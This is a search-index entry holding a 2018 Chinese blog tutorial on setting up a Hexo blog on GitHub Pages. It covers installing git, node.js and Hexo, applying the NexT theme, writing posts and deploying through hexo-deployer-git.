    <url>%2F2018%2F08%2F06%2FBlog-build-your-own-blog-with-GitHub-and-Hexo%2F</url>
    <content type="text"><![CDATA[我这里选用的是GitHub.io以及Hexo来搭建自己的博客的 配置必备 gitnode.js git的安装 Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持 无需多讲，一路默认 node.js的安装 简单的说 Node.js 就是运行在服务端的 JavaScript。Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。 操作空间不大，一路默认 正式开始安装 Hexo进入命令行 输入命令 npm install -g hexo 顺便把这个也安装一下 自动部署发布工具 npm install hexo-deployer-git --save 初始化 Hexo选择你博客存放的位置 (建议创建一个新的文件夹_初始化需要一个空的文件夹)然后命令行输入命令 hexo init git主题本身自带主题 可以暂时跳过该操作 若需要更换主题时再进行操作 此处以我使用的主题为例进入你的 themes目录 命令行输入命令 git clone https://github.com/iissnan/hexo-theme-next.git 主题下载后需要进行以下操作才能更换根目录下的 _config.yml修改 xxxxx为你的主题名 ps.注意有空格themes: XXXXX 本地浏览博客命令行输入命令 12hexo ghexo s hexo g 生成hexo s 启动服务预览 在浏览器输入：localhost:4000 就可以进行访问Ctrl+C 即可退出 写文章根目录下命令行 输入命令1hexo new &apos;文章名字&apos; 在source目下的 _posts目录下 会出现 .md文件以下为一般完整内容 1234567title: postName #文章页面上的显示名称，一般是中文date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面---以下文章是正文 上传到GitHub上 首先你得有GitHub账号然后你创建了一个仓库为 用户名.gitHub.iossh密钥自己配好 根目录下 _config.yml文件内把你的git写进去 现在写的是我的 替换一下就ok了 123deploy: type: git repo: git@github.com:MoBenw/MoBenw.github.io.git 满足以上条件命令行 输入命令 hexo clean &amp;&amp; hexo g &amp;&amp; hexo d hexo clean 清理缓存hexo g 生成hexo d 部署 使用你的GitHub.io访问到这里你就基本上会基本的GitHub上Hexo的博客搭建了 (感觉语句不通 不管了) 有关于README.md 在 source目录下 创建一个 README.md 文件 里面是你要写的内容进入根目录 打开配置文件 _config.yml修改 跳过渲染内容skip_render: README.md]]></content>
      <categories>
        <category>Hexo博客搭建</category>
      </categories>
      <tags>
        <tag>安装与配置</tag>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
</search>
